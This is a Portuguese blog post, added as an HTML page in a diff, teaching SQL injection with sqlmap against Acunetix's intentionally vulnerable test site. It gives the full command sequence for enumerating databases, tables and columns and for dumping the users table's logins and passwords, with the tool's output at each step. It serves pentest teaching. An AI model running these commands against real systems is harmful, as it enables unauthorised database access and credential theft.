@@ -1,0 +1,402 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+	<!-- Meta -->
+	<meta charset="UTF-8"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+	<meta name="generator" content="Jekyll">
+
+	<title>Analisando vulnerabilidades com sqlmap</title>
+	<link rel="stylesheet"  href="/css/font-awesome/css/font-awesome.min.css">
+
+	<!-- CSS & fonts -->
+	<link rel="stylesheet" href="/css/main.css">
+	<link href="//fonts.googleapis.com/css?family=Suez+One|Ubuntu:300,400,500,700" rel="stylesheet" data-n-head="true">
+
+	<!-- RSS -->
+	<link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" />
+
+	<!-- Icons -->
+
+	<link rel="apple-touch-icon" sizes="57x57" href="/img/logo/apple-icon-57x57.png">
+	<link rel="apple-touch-icon" sizes="60x60" href="/img/logo/apple-icon-60x60.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="/img/logo/apple-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="76x76" href="/img/logo/apple-icon-76x76.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="/img/logo/apple-icon-114x114.png">
+	<link rel="apple-touch-icon" sizes="120x120" href="/img/logo/apple-icon-120x120.png">
+	<link rel="apple-touch-icon" sizes="144x144" href="/img/logo/apple-icon-144x144.png">
+	<link rel="apple-touch-icon" sizes="152x152" href="/img/logo/apple-icon-152x152.png">
+	<link rel="apple-touch-icon" sizes="180x180" href="/img/logo/apple-icon-180x180.png">
+	<link rel="icon" type="image/png" sizes="192x192"  href="/img/logo/android-icon-192x192.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/img/logo/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="96x96" href="/img/logo/favicon-96x96.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/img/logo/favicon-16x16.png">
+	<link rel="manifest" href="/img/logo/manifest.json">
+	<meta name="msapplication-TileColor" content="#ffffff">
+	<meta name="msapplication-TileImage" content="/img/logo/ms-icon-144x144.png">
+	<meta name="theme-color" content="#ffffff">
+</head>
+
+
+  <body>
+    <div id="wrap">
+        <!-- IF para definir o HEADER -->
+        
+          <header data-v-ae5c0adc="" class="header">
+   <a data-v-ae5c0adc="" href="/" class="header__back nuxt-link-active">
+      <svg data-v-ae5c0adc="" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left">
+         <line data-v-ae5c0adc="" x1="20" y1="12" x2="4" y2="12"></line>
+         <polyline data-v-ae5c0adc="" points="10 18 4 12 10 6"></polyline>
+      </svg>
+      <span>Ir para Home</span>
+   </a>
+   <div data-v-ae5c0adc="">
+      <nav role="navigation" class="navbar">
+         <ul role="menu" class="navbar__nav">
+            <li class="navbar__nav-item navbar__nav-item--search">
+               <div class="inner search__box">
+  <a href="#modal" role="link" class="navbar__nav-link">
+    <svg  xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="#ffffff">
+      <title class="search-icon">Search icon</title>
+      <path  fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path>
+    </svg>
+  </a>
+</div>
+<div class="modal" id="modal">
+  <div class="search__box">
+    <a class="modal--close" href="#">&times;</a>
+      <svg data-v-38ac2332="" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="#404756" class="search__icon"><title data-v-38ac2332="" id="searchicon">Search icon</title><path data-v-38ac2332="" fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path></svg>
+      <input type="text" id="search-input" class="search__input" placeholder="Digite algo..." autofocus>
+
+      <ul id="results-container"></ul>
+  </div>
+</div>
+<script src="js/simple-jekyll-search.min.js"></script>
+<script>
+SimpleJekyllSearch({
+  searchInput: document.getElementById('search-input'),
+  resultsContainer: document.getElementById('results-container'),
+  json: '/search.json'
+})
+</script>
+            </li>
+            <li data-v-2651ba95="" role="menuitem" class="navbar__nav-item">
+            	<a href="/" class="navbar__nav-link" title="Sobre" role="link">Home</a>
+            </li>
+            <li data-v-2651ba95="" role="menuitem" class="navbar__nav-item">
+               <a href="/projetos" class="navbar__nav-link" title="Sobre" role="link">Projetos</a>
+            </li>
+            <!-- FOR para gerar os intens do menu. -->
+            
+			    
+			 
+			    
+			    <li role="menuitem" class="navbar__nav-item">
+			    	<a role="link" class="navbar__nav-link" href="/about" title="Sobre">Sobre</a>
+			    </li>
+			    
+			 
+			    
+			 
+			    
+			 
+			    
+			 
+			    
+			 
+			    
+			 
+			    
+			 
+			    
+			 
+         </ul>
+      </nav>
+      <!---->
+   </div>
+</header>
+
+
+
+<header id="header" class="pageHeader pageHeader--background">
+	<article itemscope="itemscope" itemtype="http://schema.org/NewsArticle" class="article">
+		<figure itemprop="image" itemscope="itemscope" itemtype="http://schema.org/ImageObject" class="pageHeader__image">
+			<meta itemprop="url" content="img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/syringe-code2.jpg">
+			<img src="img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/syringe-code2.jpg" alt="Analisando vulnerabilidades com sqlmap" />
+		</figure>
+		<div class="info-header">
+			<h1 class="pageHeader__title">Analisando vulnerabilidades com sqlmap</h1>
+			<ol itemscope="itemscope" itemtype="http://schema.org/BreadcrumbList" class="breadcrumb">
+				<li itemprop="itemListElement" itemscope="itemscope" itemtype="http://schema.org/ListItem" class="breadcrumb__item">
+					<a  href="/" class="breadcrumb__link nuxt-link-active" title="Home" itemprop="item">
+						<span itemprop="name">Home</span>
+						<meta  itemprop="position" content="1">
+					</a>
+					<span class="breadcrumb__divider">»</span>
+				</li>
+				
+				<li itemprop="itemListElement" itemscope="itemscope" itemtype="http://schema.org/ListItem" class="breadcrumb__item">
+					<a class="breadcrumb__link nuxt-link-exact-active nuxt-link-active breadcrumb__link--active" title="Analisando vulnerabilidades com sqlmap" itemprop="item" href="/analisando-vulnerabilidades-com-sqlmap">
+					<span itemprop="name">Analisando vulnerabilidades com sqlmap</span>
+					<meta itemprop="position" content="2">
+					</a>
+				</li>
+
+			</ol>
+			<p itemprop="description" class="pageHeader__description">Vamos analisar uma pequena falha encontrada em um banco de dado Mysql, com o sqlmap</p>
+			<div data-v-669fd401="" class="pageHeader__meta">
+
+				<span data-v-669fd401="">Publicado em Fevereiro de 2016, por <span data-v-669fd401="" itemprop="author">Andrey Glauzer</span>
+			</div>
+		</div>
+	</span>
+</header>
+
+        
+
+        <!-- Main content -->
+    	  <div class="container">
+          <div class="grid grid--1of2">
+        			<article id="post-page">
+	<div class="content">
+		<h2 id="sql-injection">SQL Injection</h2>
+
+<p>Hoje vou falar um pouco sobre uma ótima ferramenta para fazer <code class="highlighter-rouge">pentest</code>, que é muito utilizada para fazer <code class="highlighter-rouge">SQL injection</code>, vou falar sobre o <code class="highlighter-rouge">sqlmap</code> que tem como foco buscar vulnerabilidades no <code class="highlighter-rouge">SQLi</code> que podem trazer uma grande dor de cabeça, vulnerabilidades que geralmente são causadas por falhas no desenvolvimento, e as vezes até por um funcionário descontente ou desmotivado.</p>
+
+<h3 id="mas-o-que-é-sqlmap">Mas o que é sqlmap</h3>
+
+<p>O <code class="highlighter-rouge">sqlmap</code> é uma ferramenta desenvolvida em <code class="highlighter-rouge">python</code> de código aberto, que tem como foco analisar vulnerabilidades no sql de websites ou serviços, possibilitando que você faça diversas coisas, devido à variedade de opções que ele te oferece, desde informações do formulário até tabelas de todo o banco de dados, muito popular para extrair nome de usuários e senhas.</p>
+
+<p>O que vamos abordar aqui é tenta encontrar alguma vulnerabilidade no <code class="highlighter-rouge">SQL</code>, e ver se conseguimos ganhar acesso, para fazer nosso teste vou usar o site da Acunetix <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a>, que foi disponibilizado justamente para fazer pentest.</p>
+
+<h3 id="instalando-o-sqlmap">Instalando o sqlmap</h3>
+
+<p>Sua instalação não é muito difícil, é como quaisquer outras aplicações que não vem como padrão em sua distribuição. Acesse o site oficial <a href="http://sqlmap.org/">sqlmap.org</a>, faça download de sua referência seja <code class="highlighter-rouge">.zip</code> ou <code class="highlighter-rouge">tar.gz</code>. Extraia os arquivos para uma pasta, acesse a pasta e execute <code class="highlighter-rouge">./sqlmap.py</code> ou <code class="highlighter-rouge">python sqlmap.py</code></p>
+
+<h3 id="help">Help</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./sqlmap.py <span class="nt">--help</span> | less</code></pre></figure>
+
+<p>Sempre bom conhecer a ferramenta antes de utilizarmos ela, tente ler algumas das muitas opções que o <code class="highlighter-rouge">sqlmap</code> oferece, assim você pode juntar algumas opções que podem se torna úteis.</p>
+
+<h3 id="analisando-possíveis-vulnerabilidades">Analisando possíveis vulnerabilidades</h3>
+
+<p>Coloque um som legal aí, e vamos lá. Primeiro vamos conhecer o nosso site alvo, então acesse <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a>. É possível ver na imagem abaixo que temos uma área de login, o que geralmente acontece nessas áreas, se você colocar aspas simples (‘’) no login e na senha, já indica uma vulnerabilidade, mas cheguei a fazer esse teste e não tive resultado nenhum, então quer dizer que não temos vulnerabilidade nessa página de login, ou que eu não consegui encontrar. :(</p>
+
+<p><img src="/img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/screenshot04.png" alt="screenshot" /></p>
+
+<p>Mas não podemos criar pânico, vamos dá uma olhada melhor, ali do lado esquerdo temos um menu na vertical onde é possível acessar uma página de categorias. Ótimo quer dizer que temos um banco de dados ali também.</p>
+
+<p><img src="/img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/screenshot02.png" alt="screenshot" /></p>
+
+<p>Essas categorias podem ser exploradas, então vou selecionar a segunda categoria e vamos ver o que ela tem para nos oferecer, porque é onde está o conteúdo relacionado ao banco de dados.</p>
+
+<p><img src="/img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/screenshot03.png" alt="screenshot" /></p>
+
+<p>Essa categoria que selecionei tem apenas um resultado relacionado a ela, mas não tem problema o nosso foco aqui é encontrar vulnerabilidades e não comprar. Agora vamos analisar o <code class="highlighter-rouge">URL</code> da página.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">http://testphp.vulnweb.com/listproducts.php?cat<span class="o">=</span>2</code></pre></figure>
+
+<p>Legal, vamos pôr um ponto de interrogação <code class="highlighter-rouge">?</code> ali no final da nossa <code class="highlighter-rouge">URL</code>, quem sabe temos algum erro no sql.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">http://testphp.vulnweb.com/listproducts.php?cat<span class="o">=</span>2?</code></pre></figure>
+
+<p>Muito bom encontramos o que precisávamos, um pequeno erro no sql, e já descobrimos qual é o sql que ele utiliza o <code class="highlighter-rouge">Mysql</code>.</p>
+
+<p><img src="/img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/screenshot05.png" alt="screenshot" /></p>
+
+<p>Já encontramos a vulnerabilidade que precisávamos então vamos para o <code class="highlighter-rouge">sqlmap</code>, que será uma peça fundamental, onde iremos tentar puxar mais informações desse banco de dados.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./sqlmap.py <span class="nt">-u</span> http://testphp.vulnweb.com/listproducts.php?cat<span class="o">=</span>2 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">--dbs</span></code></pre></figure>
+
+<p>O <code class="highlighter-rouge">-u</code> indica que estamos usando uma url já o <code class="highlighter-rouge">--dbms=mysql</code> indica para que seja feita busca no mysql, que é o banco de dados utilizado pelo site, assim a busca fica muito mais rápida, se não utilizarmos essa opção ele vai demorar um pouco mais, porque vai tentar com todos os bancos de dados e por fim o <code class="highlighter-rouge">-dbs</code> está pedindo para que liste os bancos de dados.</p>
+
+<p>Após executar, o resultado foi:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>00:19:41] <span class="o">[</span>INFO] testing MySQL
+<span class="o">[</span>00:19:41] <span class="o">[</span>INFO] confirming MySQL
+<span class="o">[</span>00:19:41] <span class="o">[</span>INFO] the back-end DBMS is MySQL
+web application technology: Nginx, PHP 5.3.10
+back-end DBMS: MySQL <span class="o">&gt;=</span> 5.0.0
+<span class="o">[</span>00:19:41] <span class="o">[</span>INFO] fetching database names
+available databases <span class="o">[</span>2]:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> acuart
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
+
+<span class="o">[</span>00:19:41] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/nglauzer/.sqlmap/output/testphp.vulnweb.com'</span></code></pre></figure>
+
+<p>Até aqui tranquilo, acabamos de descobrir mais um pouco, agora sabemos que ele tem um banco de dados chamado <code class="highlighter-rouge">acuart</code> e o outro <code class="highlighter-rouge">information_schema</code>. Vamos analisar esse <code class="highlighter-rouge">acuart</code></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./sqlmap.py <span class="nt">-u</span> http://testphp.vulnweb.com/listproducts.php?cat<span class="o">=</span>2 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">--dbs</span> <span class="nt">-D</span> acuart <span class="nt">--tables</span></code></pre></figure>
+
+<p>A opção <code class="highlighter-rouge">-D</code> mostra qual o banco de dados que vamos analisar que seria o <code class="highlighter-rouge">acuart</code> que é a nossa segunda opção, já o <code class="highlighter-rouge">--tables</code>, vai listar todas as tabelas existentes no banco de dados que acabamos de informar.</p>
+
+<p>Nosso resultado foi:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>00:28:26] <span class="o">[</span>INFO] fetching tables <span class="k">for </span>database: <span class="s1">'acuart'</span>
+Database: acuart
+<span class="o">[</span>8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+<span class="o">[</span>00:28:26] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/nglauzer/.sqlmap/output/testphp.vulnweb.com'</span></code></pre></figure>
+
+<p>Olha ali temos uma tabela chamada <code class="highlighter-rouge">users</code>, legal que é o nosso foco aqui, descobrir usuário e senha então vamos pegar mais informações desse banco de dados da tabela <code class="highlighter-rouge">users</code></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./sqlmap.py <span class="nt">-u</span> http://testphp.vulnweb.com/listproducts.php?cat<span class="o">=</span>2 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">--dbs</span> <span class="nt">-D</span> acuart <span class="nt">-T</span> users <span class="nt">--columns</span></code></pre></figure>
+
+<p>O <code class="highlighter-rouge">-T</code>, estou informando que desejo informações da tabela já o <code class="highlighter-rouge">users</code> diz qual é a nossa tabela, e o <code class="highlighter-rouge">--columns</code>, informa que desejo as colunas dessa tabela.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>00:33:01] <span class="o">[</span>INFO] fetching columns <span class="k">for </span>table <span class="s1">'users'</span> <span class="k">in </span>database <span class="s1">'acuart'</span>
+Database: acuart
+Table: users
+<span class="o">[</span>8 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| address | mediumtext   |
+| cart    | varchar<span class="o">(</span>100<span class="o">)</span> |
+| cc      | varchar<span class="o">(</span>100<span class="o">)</span> |
+| email   | varchar<span class="o">(</span>100<span class="o">)</span> |
+| name    | varchar<span class="o">(</span>100<span class="o">)</span> |
+| pass    | varchar<span class="o">(</span>100<span class="o">)</span> |
+| phone   | varchar<span class="o">(</span>100<span class="o">)</span> |
+| uname   | varchar<span class="o">(</span>100<span class="o">)</span> |
++---------+--------------+
+
+<span class="o">[</span>00:33:01] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/nglauzer/.sqlmap/output/testphp.vulnweb.com'</span></code></pre></figure>
+
+<p>Estamos quase chegando na nossa reta final, já temos ali as colunas <code class="highlighter-rouge">uname</code> e <code class="highlighter-rouge">pass</code>, vamos extrair ela e ver o que temos.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./sqlmap.py <span class="nt">-u</span> http://testphp.vulnweb.com/listproducts.php?cat<span class="o">=</span>2 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">--dbs</span> <span class="nt">-D</span> acuart <span class="nt">-T</span> users <span class="nt">-C</span> uname,pass,name,email <span class="nt">--dump</span></code></pre></figure>
+
+<p>No <code class="highlighter-rouge">-C</code> estou informando que desejo as colunas já <code class="highlighter-rouge">uname,pass,name,email</code>, informando quais são essas colunas que eu desejo, e o <code class="highlighter-rouge">--dump</code>, extrai as informações dessas colunas.</p>
+
+<p>Resultado:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>00:41:04] <span class="o">[</span>INFO] fetching entries of column<span class="o">(</span>s<span class="o">)</span> <span class="s1">'email, name, pass, uname'</span> <span class="k">for </span>table <span class="s1">'users'</span> <span class="k">in </span>database <span class="s1">'acuart'</span>
+<span class="o">[</span>00:41:04] <span class="o">[</span>INFO] analyzing table dump <span class="k">for </span>possible password hashes
+Database: acuart
+Table: users
+<span class="o">[</span>1 entry]
++-------+------+------------+-----------------+
+| uname | pass | name       | email           |
++-------+------+------------+-----------------+
+| <span class="nb">test</span>  | <span class="nb">test</span> | John Smith | email@email.com |
++-------+------+------------+-----------------+
+
+<span class="o">[</span>00:41:04] <span class="o">[</span>INFO] table <span class="s1">'acuart.users'</span> dumped to CSV file <span class="s1">'/home/nglauzer/.sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv'</span>
+<span class="o">[</span>00:41:04] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/home/nglauzer/.sqlmap/output/testphp.vulnweb.com</span></code></pre></figure>
+
+<p>Bom, se você chegou até aqui parabéns, está na hora de ver se essa parada aqui é de verdade mesmo e ter certeza que não estou inventando nada, rs. Vamos para o site naquela página de login, tentar usar o a senha <code class="highlighter-rouge">test</code> e o login <code class="highlighter-rouge">teste</code>, e ver se o nome e e-mail bate com as informações.</p>
+
+<p>Página de login:</p>
+
+<p><img src="/img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/screenshot06.png" alt="screenshot" /></p>
+
+<p>Página de acesso:</p>
+
+<p><img src="/img/posts/2016-04-19-analisando-vulnerabilidades-com-sqlmap/screenshot07.png" alt="screenshot" /></p>
+
+<h3 id="conclusão">Conclusão</h3>
+
+<p>Como foi possível ver, esse realmente era o usuário e senha para acessar a página, e os dados bateram com as informações que obtivemos na hora de pegar as informações das colunas. Agora é só verificar outras vulnerabilidades possíveis no site da Acunetix, e explorar elas, sempre tem um novo jeito.</p>
+
+<h3 id="referências">Referências</h3>
+
+<p><a href="http://www.sqlinjection.net/">sqlinjection</a></p>
+
+<p><a href="http://sqlmap.org/">sqlmap.org/</a></p>
+
+<hr />
+<p>Viu algum erro ou gostaria de adicionar alguma sugestão a essa matéria? Comente.</p>
+
+		<div id="coment" class="comments">
+	<div class="content-coment">
+		<h3 data-v-dd8644c2="">Comentários para: <span class="opacity">"Analisando vulnerabilidades com sqlmap"</span></h3>
+		<div id="disqus_thread"></div>
+		<script>
+
+		/**
+		 *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+		 *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+		/*
+		var disqus_config = function () {
+		    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+		    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+		};
+		*/
+		(function() { // DON'T EDIT BELOW THIS LINE
+		    var d = document, s = d.createElement('script');
+		    s.src = '//andreyglauzer-1.disqus.com/embed.js';
+		    s.setAttribute('data-timestamp', +new Date());
+		    (d.head || d.body).appendChild(s);
+		})();
+		</script>
+		<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                                    
+	</div>
+</div>
+
+<style type="text/css">
+
+.comments{
+    background-color: #fff;
+    border-top: 1.12px solid rgba(64,71,86,.1);
+    border-top: .07rem solid rgba(64,71,86,.1);
+    padding: 30px 0 0;
+    padding: 1.875rem 0 0;
+    margin-top: 30px;
+    margin-top: 1.875rem;
+
+div.alinhamento-header-posts{
+    padding-top: 3rem;
+}
+
+div#coment{
+    background-color: #fff;
+    padding: 30px 0;
+    margin-top: 15px;
+}
+div.content-coment h3 span.opacity{
+        opacity: .6;
+    font-weight: 500;
+}
+div.content-coment{
+    max-width: 768px;
+    max-width: 48rem;
+    display: block;
+    margin:0 auto;
+}
+</style>
+	</div>
+</article>
+
+
+          </div>
+    		
+    		  <!-- Definicação de paginação -->
+          
+
+    	  </div>
+    	    
+    	    <!-- Footer -->
+    	    <footer>
+	Made with ♥ by <a target="_blank" href="https:/github.com/andreyglauzer/">Andrey Glauzer</a>, using <a href="">Jekyll</a>. This is an open <a target="_blank" href="https:/github.com/andreyglauzer/andreyglauzer.github.io/">source code</a>. Version 1.1.0.
+</footer>
+
+    	    <!-- Script -->
+          <script src="/js/main.js"></script>	
+
+  	</div>
+  </body>
+</html>
